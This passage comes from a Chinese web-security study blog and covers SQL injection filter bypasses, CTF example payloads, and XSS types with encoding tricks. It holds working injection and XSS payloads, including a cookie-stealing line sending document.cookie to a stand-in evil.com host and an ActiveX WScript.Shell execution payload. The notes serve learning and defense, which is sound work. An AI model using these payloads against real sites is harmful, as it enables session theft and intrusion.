class="string">'$_SESSION['</span>username']'</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;登录/注册处的SQL语句都经过了addslashes函数、单引号闭合的处理，且无编码产生的问题。</p><p>&emsp;&emsp;对于上述举的语句我们可以先注册一个名为<code>admin&#39; #</code>的用户名，因为在注册进行了单引号的转义，故我们并不能直接进行insert注入，最终将我们的用户名存储在了服务器中，注意：反斜杠转义掉了单引号，在mysql中得到的数据并没有反斜杠的存在。</p><p>&emsp;&emsp;在我们进行登录操作的时候，我们用注册的<code>admin&#39; #</code>登录系统，并将用户部分数据存储在对于的SESSION中，如<code>$_SESSION[&#39;username&#39;]</code>。</p><p>&emsp;&emsp;上述的<code>$_SESSION[&#39;username&#39;]</code>并没有经过处理，直接拼接到了SQL语句之中，就会造成SQL注入，最终的语句为：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * <span class="keyword">from</span><span class="built_in"> users </span>where <span class="attribute">username</span>=<span class="string">'admin'</span> #'</span><br></pre></td></tr></table></figure><p>常见注入方式的基础原理讲完了，接下来就讲讲，怎么去绕过一些考虑不周到的过滤。</p><h3 id="关键字过滤"><a href="#关键字过滤" class="headerlink" title="关键字过滤"></a>关键字过滤</h3><p>过如遇到替换为空的情况，且不是递归检查，就可以用双写绕过</p><p>利用&amp;&amp;、||可以代替and和or，+号，</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">'||1='<span class="number">1</span>     <span class="meta">#or</span></span><br><span class="line">'&amp;&amp;1='<span class="number">1</span>     <span class="meta">#and</span></span><br></pre></td></tr></table></figure><p>注释(/**/)可以代替空格，%09, %0a, %0b, %0c, %0d, %a0等部分不可见字符可也代替空格</p><p>如：<code>select * from user where username=&#39;admin&#39;union(select+title,content/**/from/*!article*/where/**/id=&#39;1&#39;and!!!!~~1=1)</code></p><p>逗号被过滤：substr(data from 1 for 1)相当于substr(data,1,1)、limit 9 offset 4相当于limt 9,4</p><p>主要思路就使用同义函数/语句代替，如if函数可用case when condition then 1 else 0 end语句代替。</p><p>如果单独过滤union,使用盲注来获取数据</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">'and substr((<span class="name">select</span> pass from users limit <span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>)='s</span><br></pre></td></tr></table></figure><h3 id="一些小Trick"><a href="#一些小Trick" class="headerlink" title="一些小Trick"></a>一些小Trick</h3><p>这里跟大家分享一些有意思的Trick，主要在一些CTF题出现，这里也把它记下来，方便复习。</p><h4 id="PHP-union-select-ig绕过。"><a href="#PHP-union-select-ig绕过。" class="headerlink" title="PHP/union.+?select/ig绕过。"></a>PHP<code>/union.+?select/ig</code>绕过。</h4><p>在某些题目中，题目禁止union与select同时出现时，会用此正则来判断输入数据。</p><ul><li>利用点：<a href="https://bugs.php.net/bug.php?id=70699" target="_blank" rel="noopener">PHP正则回溯BUG</a></li><li>具体分析文章：<a href="https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html" target="_blank" rel="noopener">PHP利用PCRE回溯次数限制绕过某些安全限制</a></li></ul><blockquote><p>PHP为了防止正则表达式的拒绝服务攻击（reDOS），给pcre设定了一个回溯次数上限<code>pcre.backtrack_limit</code>。若我们输入的数据使得PHP进行回溯且此数超过了规定的回溯上限此数(默认为 100万)，那么正则停止，返回未匹配到数据。</p></blockquote><p>故而我们构造payload：<code>union/*100万个a，充当垃圾数据*/select</code>即可绕过正则判断。</p><p>一道相关的CTF题：<a href="https://github.com/MrR3boot/CTF/tree/master/TetCTF-2020" target="_blank" rel="noopener">TetCTF-2020 WP BY MrR3boot</a></p><h4 id="LIMIT之后的字段数判断"><a href="#LIMIT之后的字段数判断" class="headerlink" title="LIMIT之后的字段数判断"></a>LIMIT之后的字段数判断</h4><p>我们都知道若注入点在where子语句之后，判断字段数可以用<code>order by</code>或<code>group by</code>来进行判断，而<code>limit</code>后可以利用 <code>into @,@</code> 判断字段数，其中@为mysql临时变量。</p><p><a href="https://img.0x002.com/article/MysqlSQLi/limitInto.png" target="_blank" rel="noopener"><img src="https://img.0x002.com/article/MysqlSQLi/limitInto.png" alt="img"></a></p><h3 id="实例："><a href="#实例：" class="headerlink" title="实例："></a>实例：</h3><p>[极客大挑战 2019]EasySQL【万能密码】</p><p><code>admin&#39; or 1=1 #</code></p><p>[极客大挑战 2019]loveSQL【基础联合注入】</p><p><code>?username=1&#39; union select 1,2,group_concat(id,username,password) from l0ve1ysq1%23&amp;password=1</code></p><p>[极客大挑战 2019]babySQL【双写绕过】</p><p><code>?username=admin&amp;password=admin1%27uniunionon%20selselectect%201%2C2%2Cgroup_concat(passwoorrd)%20frfromom%20b4bsql%23</code></p><p>PS：这么看来想要注入，我们必须要用到单引号或者双引号来逃逸字符串，所以只过滤引号就能防住SQL注入了么？并不是，这里有一个例子</p><p>&emsp;&emsp;如果你只是过滤了单引号，按照你上面的sql语句【<code>String sql=&quot;select * from user_table where username=&#39;&quot;+name+&quot;&#39; and password=&#39;&quot;+password+&quot;&#39;&quot;;</code>】，依然是可以注入的。</p><p>&emsp;&emsp;username这样输入：<code>1\</code></p><p>&emsp;&emsp;password这样输入：<code>or 1=1;#</code></p><p>&emsp;&emsp;经过你的程序之后sql语句变成这样select * from user_table where username=’1&#39; and password=’or 1=1;#’; 在这里，username中输入的\转义了它后面的单引号，因此sql语句实际上变成 username的值等于这样一个字符串： 1’ and password=，后面我再接or 1=1;#就生效了，</p>]]></content>
      
      
      <categories>
          
          <category> Web小屋 </category>
          
          <category> SQL </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> SQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Web学习笔记 之 XSS</title>
      <link href="/2020/07/26/Web%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B9%8BXSS/"/>
      <url>/2020/07/26/Web%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B9%8BXSS/</url>
      
        <content type="html"><![CDATA[<h2 id="指令、数据"><a href="#指令、数据" class="headerlink" title="指令、数据"></a>指令、数据</h2><p>&emsp;&emsp;Web世界是由数据构成的，而存储、传输、展示出这些数据则需要指令的执行。合适的指令在合适的环境下解释执行，从而产生合适的数据内容。比如<code>select username,email from user where id = 1;</code>,这是一条SQL查询指令，当这条指令被数据库引擎解释执行时就会产生一组数据，内容由username、email构成。再如<code>&lt;script&gt;eval(location.hash.substr(1));&lt;/script&gt;</code> <code>&lt;script&gt;&lt;/script&gt;</code>标签内是一句JavaScript指令，由浏览器的JS引擎来解释执行，解释的结果就是数据。而它本身则是一个HTML标签，由浏览器的DOM引擎渲染执行。</p><p>&emsp;&emsp;如果指令和数据完全独立，那显然是太平盛世，然而如果正常的输入数据被注入了指令，并且在解释的过程中指令还被独立执行了，那么攻击就发生了。</p><p>&emsp;&emsp;如果<a href="http://www.evil.com/info.html的代码内容为`" target="_blank" rel="noopener">www.evil.com/info.html的代码内容为`</a><script>eval(location.hash.substr(1));</script>`</p><p>&emsp;&emsp;我们构造如下链接<code>http://www.evil.com/info.html#new%20Image().src=&quot;http://www.evil.com/steal.php?c=&quot;+escape(document.cookie)</code></p><p>&emsp;&emsp;那么浏览器就会解释执行<code>eval(locaion.hash.substr(1));</code>变为<code>eval(&#39;new Image().src=&quot;http://www.evil.com/steal.php?c=&quot;+escape(document.cookie)&#39;)</code>  </p><p>&emsp;&emsp;当被攻击者被诱骗点了该链接时，Cookies会话信息就会被传到黑客网站上。</p><p>&emsp;&emsp;攻击的发生，是因为通过url注入了一段恶意的指令，并且该指令能被执行。</p><h2 id="同源策略"><a href="#同源策略" class="headerlink" title="同源策略"></a>同源策略</h2><p>&emsp;&emsp;同源策略有几个关键词：不同域、客户端脚本、授权、读写、资源。</p><p>&emsp;&emsp;同域要求两个站点同协议、同域名、同端口。</p><p>&emsp;&emsp;授权：HTML5新标准中提到关于AJAX跨域访问默认情况下是不允许的，只有目标站点明确的返回HTTP响应头：<code>Access-Control-Allow-Origin: http://www.evil.com</code></p><p>&emsp;&emsp;资源：包括HTTP消息头、整个DOM树、浏览器存储等</p><p>&emsp;&emsp;DOM：全称Document Object Model，即文档对象模型，就是浏览器将HTML/XML这样的文档抽象成一个树形结构，树上的每一个节点都代表HTML/XML中的标签、标签属性或标签内容。</p><h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p>&emsp;&emsp;url有个重点就是编码方式，有三类：escape、encodeURI、encodeURIComponent,对应的解码函数是：unescape、decodeURI、decodeURIComponent。</p><h2 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h2><p>&emsp;&emsp;XSS全称为跨站脚本(Cross Site Scripting)。跨站点脚本（XSS）攻击是一种注射型攻击，攻击者在可信的网页中嵌入恶意代码，用户访问可信网页时触发XSS而被攻击。</p><p>&emsp;&emsp;很多时候输入的内容长度是有限制的。真正的XSS弹窗毫无意义，所以攻击代码可能会比较长，一般注入类似的下面的引用第三方域上的脚本<code>&lt;script&gt;src=&quot;http://www.evil.com/xss.js&quot;&gt;&lt;/script&gt;</code></p><h3 id="反射型-XSS"><a href="#反射型-XSS" class="headerlink" title="反射型 XSS"></a>反射型 XSS</h3><p>&emsp;&emsp;发出请求时，XSS代码出现在URL中，作为输入提交到服务器，服务端解析后响应，在响应内容中出现这段XSS代码，最后浏览器解析执行。这个过程就像是一次反射，故称为反射型XSS。</p><p>&emsp;&emsp;一个简单的例子，在<a href="http://www.foo.com/xss/reflect1.php代码如下`" target="_blank" rel="noopener">http://www.foo.com/xss/reflect1.php代码如下`</a><?php echo $_GET['x'] ?><code>，输入的x的值未经任何过滤就直接输出，可以提交：</code><a href="http://www.foo.com/xss/reflect1.php?x=" target="_blank" rel="noopener">http://www.foo.com/xss/reflect1.php?x=</a><script>alert(/Hello,/)</script><code>，服务端解析时，echo就会完整地输出</code><script>alert(/you are hacked by V, haha!/)</script>`到响应体中，然后浏览器解析执行触发。【彩蛋哈哈】</p><h3 id="存储型-XSS"><a href="#存储型-XSS" class="headerlink" title="存储型 XSS"></a>存储型 XSS</h3><p>&emsp;&emsp;存储型XSS和反射型XSS的差别仅在于；提交的XSS代码会存储在服务端，下次请求目标页面时不用再提交XSS代码，最典型的例子是留言板XSS。</p><p>&emsp;&emsp;除了留言板，如果服务端有一些记录ip的的功能甚至可以用X-Forwarded-For打XSS，见<a href="https://xz.aliyun.com/t/7887" target="_blank" rel="noopener">信呼OA存储型XSS 0day复现</a></p><h3 id="DOM型-XSS"><a href="#DOM型-XSS" class="headerlink" title="DOM型 XSS"></a>DOM型 XSS</h3><p>&emsp;&emsp;DOM型 XSS与反射型、存储型的差别在于，DOM型 XSS的XSS代码并不需要服务器解析响应的直接参与，触发XSS靠的就是浏览器端的DOM解析，可以认为完全是客户端的事。</p><p>&emsp;&emsp;<a href="https://www.zhihu.com/question/26628342/answer/33504799" target="_blank" rel="noopener">知乎</a>上也有一种说法：DOM型XSS取决于输出位置，并不取决于输出环境，简单去理解就是因为他输出点在DOM，所以在道哥的《白帽子讲Web安全里》也有详细介绍。DOM型XSS是通过url传入参数去控制触发的。</p><p>&emsp;&emsp;然后问了一些Web师傅，他们的回答是，把DOM型XSS看作是反射型XSS的一种，是在前端实现的。所以DOM型和反射型XSS都只能自己日自己，都是需要与人交互才能产生效果。</p><h4 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h4><p>来源：<a href="https://xz.aliyun.com/t/3919" target="_blank" rel="noopener">记一次从DOM型XSS到RCE过程</a></p><p>打开主页会调用index.js文件</p><p><img src="https://i.loli.net/2020/07/16/xSPd7bw4BTWqUOC.png" alt="img"></p><p>可以看到代码会用getParam函数接受提交过来的platform参数，处理后直接传给eval</p><p>再跟进getParam函数</p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 用正则表达式获取地址栏参数</span></span><br><span class="line">function getParam(paramName) &#123;</span><br><span class="line">    paramValue = <span class="string">""</span>, isFound = !<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>.location.search.indexOf(<span class="string">"?"</span>) == <span class="number">0</span> &amp;&amp; <span class="keyword">this</span>.location.search.indexOf(<span class="string">"="</span>) &gt; <span class="number">1</span>) &#123;</span><br><span class="line">        arrSource = unescape(<span class="keyword">this</span>.location.search).substring(<span class="number">1</span>, <span class="keyword">this</span>.location.search.length).split(<span class="string">"&amp;"</span>), i = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (i &lt; arrSource.length &amp;&amp; !isFound) arrSource[i].indexOf(<span class="string">"="</span>) &gt; <span class="number">0</span> &amp;&amp; arrSource[i].split(<span class="string">"="</span>)[<span class="number">0</span>].toLowerCase() == paramName.toLowerCase() &amp;&amp; (paramValue = arrSource[i].split(<span class="string">"="</span>)[<span class="number">1</span>], isFound = !<span class="number">0</span>), i++</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> paramValue == <span class="string">""</span> &amp;&amp; (paramValue = <span class="literal">null</span>), paramValue</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里并没有做任何过滤，所以我们的参数值是完整的被返回过来的。这里就造成了代码执行。</p><p>payload:<code>http://xxx.xxx.xxx.xxx/?platform=alert(“xss”)</code>，执行效果</p><p><img src="https://i.loli.net/2020/07/16/jSbda5qKkgpB7cY.png" alt="img"></p><p>RCE执行-payload</p><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> o = <span class="keyword">new</span> <span class="type">ActiveXObject</span>(<span class="string">"WScript.Shell"</span>);</span><br><span class="line">o.run(“calc.exe”);</span><br></pre></td></tr></table></figure><p>为了美观，我们对代码进行编码，编码后代码如下（头尾两个回车符）</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">String.fromCharCode(<span class="number">10</span>,<span class="number">118</span>,<span class="number">97</span>,<span class="number">114</span>,<span class="number">32</span>,<span class="number">111</span>,<span class="number">61</span>,<span class="number">110</span>,<span class="number">101</span>,<span class="number">119</span>,<span class="number">32</span>,<span class="number">65</span>,<span class="number">99</span>,<span class="number">116</span>,<span class="number">105</span>,<span class="number">118</span>,<span class="number">101</span>,<span class="number">88</span>,<span class="number">79</span>,<span class="number">98</span>,<span class="number">106</span>,<span class="number">101</span>,<span class="number">99</span>,<span class="number">116</span>,<span class="number">40</span>,<span class="number">39</span>,<span class="number">87</span>,<span class="number">83</span>,<span class="number">99</span>,<span class="number">114</span>,<span class="number">105</span>,<span class="number">112</span>,<span class="number">116</span>,<span class="number">46</span>,<span class="number">115</span>,<span class="number">104</span>,<span class="number">101</span>,<span class="number">108</span>,<span class="number">108</span>,<span class="number">39</span>,<span class="number">41</span>,<span class="number">59</span>,<span class="number">10</span>,<span class="number">111</span>,<span class="number">46</span>,<span class="number">114</span>,<span class="number">117</span>,<span class="number">110</span>,<span class="number">40</span>,<span class="number">39</span>,<span class="number">99</span>,<span class="number">97</span>,<span class="number">108</span>,<span class="number">99</span>,<span class="number">46</span>,<span class="number">101</span>,<span class="number">120</span>,<span class="number">101</span>,<span class="number">39</span>,<span class="number">41</span>,<span class="number">59</span>,<span class="number">10</span>)</span><br></pre></td></tr></table></figure><p>然而浏览器的安全机制默认禁止使用activex控件，所以。还得利用一些浏览器的漏洞来绕过。</p><h3 id="场景-HTML"><a href="#场景-HTML" class="headerlink" title="场景(HTML)"></a>场景(HTML)</h3><p>&emsp;&emsp;XSS涉及的场景很广，出现在支持HTML解析和JavaScript解析的客户端软件、页面上。在触发XSS时我们需要关注输入点与输出点，这里我们先假设有一个id=1的输入点，针对不同的输出点，我们的利用方式则是不同的。</p><p>· HTML标签之间，比如：出现在<code>&lt;div id=&quot;body”&gt;[输出]&lt;/div&gt;</code>位置</p><p>· HTML标签之内，比如：出现在<code>&lt;input type=&quot;text” value = &quot;[输出]&quot;/&gt;</code>位置</p><p>· 成为JavaScript代码的值，比如：<code>&lt;script&gt;a=&quot;[输出]&quot;,...&lt;/script&gt;</code>位置</p><p>· 成为CSS代码的值，比如：<code>&lt;style&gt;body{font-size:[输出]px;...}&lt;/style&gt;</code>位置</p><h4 id="1-HTML标签之间"><a href="#1-HTML标签之间" class="headerlink" title="1. HTML标签之间"></a>1. HTML标签之间</h4><p>&emsp;&emsp;最普通的出现在<code>&lt;div id=&quot;body”&gt;[输出]&lt;/div&gt;</code>位置，那么提交<code>id=1&lt;script&gt;alert(1)&lt;/script&gt;</code>就可了，但是在<code>&lt;title&gt;&lt;textarea&gt;&lt;xmp&gt;&lt;iframe&gt;&lt;noscript&gt;&lt;noframes&gt;&lt;plaintext&gt;</code>标签里面就不行，因为这些标签内无法执行脚本，我们得先将这些标签给闭合。另外，<code>&lt;script&gt;&lt;style&gt;</code> 是不能嵌套标签的。</p><h4 id="2-HTML标签之内"><a href="#2-HTML标签之内" class="headerlink" title="2. HTML标签之内"></a>2. HTML标签之内</h4><p>&emsp;&emsp;最普通的场景出现在<code>&lt;input type=&quot;text” value = &quot;[输出]&quot;/&gt;</code>，要触发XSS有一下两种方法</p><p><code>”onmouserover=alert(1)x=”</code>，这种是用双引号闭合属性，然后用on事件来触发脚本。【这种触发成功率更高】</p><p><code>&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code>，这种是先用双引号闭合属性，然后用尖括号又闭合了标签，然后直接执行脚本 【这种利用效果好】</p><p>&emsp;&emsp;换一种场景：<code>&lt;input type=&quot;hidden&quot; value=&quot;[输出]&quot; /&gt;</code>，一般情况下，此时我们只能闭合input标签，否则由于hidden特性导致触发不了XSS，但如果是这种语句<code>&lt;input  value=&quot;[输出]&quot;  type=&quot;hidden&quot;/&gt;</code>，仅仅是调换了两个属性的位置，我们则可以用这样一条payload：<code>1&quot; onmouserover=alert(1) type = &quot;text</code></p><p>&emsp;&emsp;输出后变为<code>&lt;input  value=&quot;1&quot; onmouserover=alert(1) type = &quot;text&quot;  type=&quot;hidden&quot;/&gt;</code>，这样输出的就是一个标准的输入框，而不是一个隐藏的表单（hidden被text插队了）</p><p>&emsp;&emsp;另外两种场景：</p><p>输出在src/href/action等属性内，比如<code>&lt;a href = &quot;[输出]”&gt;click me&lt;/a&gt;</code></p><p>这里我们除了各种闭合外，还可以：</p><p><code>javascript:alert(1)//</code></p><p><code>data:text/html;base64,PHNjcm1wdD5hbGVydCgxKTwvc2NyaXB0Pg==</code></p><p>这里有一个前提是我们提交的payload必须出现在这些属性值的开头（data协议必须作为整个属性值出现）</p><p>&emsp;&emsp;输出在on事件内：</p><p>由于on事件内是可以执行JavaScript脚本的，根据不同场景，我们需要弄清楚我们的输入是作为整个on事件出现，还是以某个函数的参数值出现、这个函数又是什么等。因为根据不同的场景我们可能需要不同的闭合策略。</p><p>最简单的场景就是：<code>&lt;a href=&quot;#&quot; onclick =&quot;eval(&#39;输出&#39;)&quot;&gt;click me &lt;/a&gt;</code></p><h3 id="DOM渲染"><a href="#DOM渲染" class="headerlink" title="DOM渲染"></a>DOM渲染</h3><h4 id="HTML与JavaScript自解码机制"><a href="#HTML与JavaScript自解码机制" class="headerlink" title="HTML与JavaScript自解码机制"></a>HTML与JavaScript自解码机制</h4><p>&emsp;&emsp;当一段JavaScript代码出现在HTML标签内，那么这里的JavaScript可以进行HTML形式的编码：进制编码（十进制、十六进制），HTML实体编码。例如：</p><p><code>&lt;input type=&quot;button” id = &quot;exec_btn” value=&quot;exec” onclik=&quot;x=&#39;&amp;lt;img src = @ onerror=alert(123) /&amp;gt;&#39;;alert(x);document.write(x)” /&gt;</code></p><p>&emsp;&emsp;但是如果用户输入出现在<code>&lt;script&gt;</code>标签内，这段内容要遵守的就是JavaScript的法则，即JavaScript编码：Unicode形式：\uH（十六进制）；普通十六进制（\xH）；纯转义：（在特殊字符前面加\进行转义。）</p><p>&emsp;&emsp;另外，在<code>&lt;textarea&gt;&lt;title&gt;&lt;iframe&gt;&lt;noscript&gt;&lt;noframes&gt;&lt;xmp&gt;</code>这几个标签中HTML也是不解析的。<code>&lt;plaintext&gt;</code>则在Firefox下不解析，在Chrome下就会。</p><h3 id="XSS过滤与绕过"><a href="#XSS过滤与绕过" class="headerlink" title="XSS过滤与绕过"></a>XSS过滤与绕过</h3><p>参考<a href="https://www.0x002.com/2019/%E5%89%8D%E7%AB%AFHack%E4%B9%8BXSS%E6%94%BB%E5%87%BB%E4%B8%AA%E4%BA%BA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/#%E5%AF%B9%E6%A0%87%E7%AD%BE%E5%B1%9E%E6%80%A7%E5%80%BC%E8%BF%9B%E8%A1%8C%E8%BD%AC%E7%A0%81" target="_blank" rel="noopener">前端Hack之XSS攻击个人学习笔记</a></p><h4 id="空格、回车和tab"><a href="#空格、回车和tab" class="headerlink" title="空格、回车和tab"></a>空格、回车和tab</h4><p>&emsp;&emsp;对XSS-Filter而言，如果仅仅是将函数加入黑名单，那么可以在函数名称之中尝试加入空格、回车、Tab等键位符来进行绕过。这是由于在JavaScript中只会将；作为语句的终止符，当浏览器引擎解析JavaScript脚本时没有匹配到；便会继续处理，知道发现下个分号为止，而换行符并不是终止符。如下列代码可绕过对关键字JavaScript|alert的过滤：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">javasc</span></span></span><br><span class="line"><span class="tag"><span class="attr">ript:aler</span></span></span><br><span class="line"><span class="tag"><span class="attr">t</span>(/<span class="attr">xss</span>/)&gt;</span></span><br></pre></td></tr></table></figure><h4 id="对标签属性值进行转码"><a href="#对标签属性值进行转码" class="headerlink" title="对标签属性值进行转码"></a>对标签属性值进行转码</h4><p><code>&lt;img src=&quot;javascript:alert(&#39;xss&#39;);&quot;&gt;</code>  =&gt;  <code>&lt;img src=&quot;javascrip&amp;#116&amp;#58alert(&#39;xss&#39;);&quot;&gt;</code></p><p>由于我们的输入出现在<code>&lt;img&gt;</code>标签内，所以可以进行实体编码来绕过过滤。</p><h4 id="使用CSS绕过"><a href="#使用CSS绕过" class="headerlink" title="使用CSS绕过"></a>使用CSS绕过</h4><p>利用CSS样式表可以执行JavaScript的特性，如</p><p>CSS直接执行JavaScript：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">"background-image:url(javascript:alert('xss'))"</span>&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="css">    <span class="selector-tag">body</span> &#123;<span class="attribute">background-image</span>:<span class="built_in">url</span>(<span class="string">"javascript:alert('xss')"</span>);&#125;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure><p>CSS中使用expression执行JavaScript:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">"width: expression(alert('xss'))"</span>&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"#"</span> <span class="attr">style</span>=<span class="string">"xss:expression(alert(/xss/))"</span>&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="css">    <span class="selector-tag">body</span> &#123;<span class="attribute">background-image</span>:<span class="built_in">expression</span>(<span class="string">"alert('xss')"</span>);&#125;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure><p>还可以利用@import直接执行JavaScript代码</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="css">    @<span class="keyword">import</span> <span class="string">'javascript:alert("xss")'</span>;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure><p>&emsp;&emsp;在现实环境下，HTML页面中的CSS与Javascript的嵌入方式很相似，且CSS也可以执行JavaScript代码，故我们的XSS代码也可以通过嵌入远程恶意CSS文件来进行XSS攻击。</p><h4 id="扰乱规则"><a href="#扰乱规则" class="headerlink" title="扰乱规则"></a>扰乱规则</h4><p>· 大小写变换;<br>· 利用<code>expression</code>执行跨站代码的时候，可以构造不同的全角字符来扰乱过滤规则;<br>· 结合样式表注释字符<code>/**/</code>，通过CSS执行JavaScript<br>· 样式标签会过滤\和\0，可以构造如<code>@i\mp\0\0ort &#39;jav\0asc\0rip\t:al\0er\t(&quot;x\0ss&quot;)&#39;</code>绕过<br>· CSS关键字进行编码处理，如<code>&lt;p style=&quot;xss:\0065xpression(alert(/xss/))&quot;&gt;</code>其中65为字母e进行unicode编码后的数字部分<br>· 利用浏览器解析注释的问题</p><h4 id="利用字符编码"><a href="#利用字符编码" class="headerlink" title="利用字符编码"></a>利用字符编码</h4><p>JavaScript支持许多的编码格式，如：unicode、escapes、十六|十|八进制</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">JS8编码：</span><br><span class="line"><span class="tag">&lt;<span class="name">details</span> <span class="attr">open</span> <span class="attr">ontoggle</span>=<span class="string">top[</span>'<span class="attr">al</span>\<span class="attr">145rt</span>'](<span class="attr">1</span>) &gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">details</span> <span class="attr">open</span> <span class="attr">ontoggle</span>=<span class="string">top[</span>'\<span class="attr">141</span>\<span class="attr">154</span>\<span class="attr">145</span>\<span class="attr">162</span>\<span class="attr">164</span>'](<span class="attr">1</span>) &gt;</span></span><br><span class="line">JS16编码：</span><br><span class="line"><span class="tag">&lt;<span class="name">details</span> <span class="attr">open</span> <span class="attr">ontoggle</span>=<span class="string">top[</span>'<span class="attr">al</span>\<span class="attr">x65rt</span>'](<span class="attr">1</span>) &gt;</span></span><br><span class="line">其他</span><br><span class="line"><span class="tag">&lt;<span class="name">details</span> <span class="attr">open</span> <span class="attr">ontoggle</span>=<span class="string">top[/al/.source%2B/ert/.source](1)</span> &gt;</span></span><br></pre></td></tr></table></figure><p>一个python写的编码小脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote,unquote</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hexlify</span><span class="params">(s)</span>:</span></span><br><span class="line">    tmp=<span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">        tmp+=<span class="string">'\\x'</span>+hex(ord(i))[<span class="number">2</span>:].rjust(<span class="number">2</span>,<span class="string">'0'</span>)</span><br><span class="line">    <span class="keyword">return</span> tmp</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">html</span><span class="params">(s)</span>:</span></span><br><span class="line">    tmp = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">        tmp += <span class="string">'&amp;#'</span> + str(ord(i))+<span class="string">';'</span></span><br><span class="line">    <span class="keyword">return</span> tmp</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">octlify</span><span class="params">(s)</span>:</span></span><br><span class="line">    tmp = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">        tmp += <span class="string">'\\'</span> + oct(ord(i))[<span class="number">2</span>:]</span><br><span class="line">    <span class="keyword">return</span> tmp</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tx</span><span class="params">(s)</span>:</span></span><br><span class="line">    <span 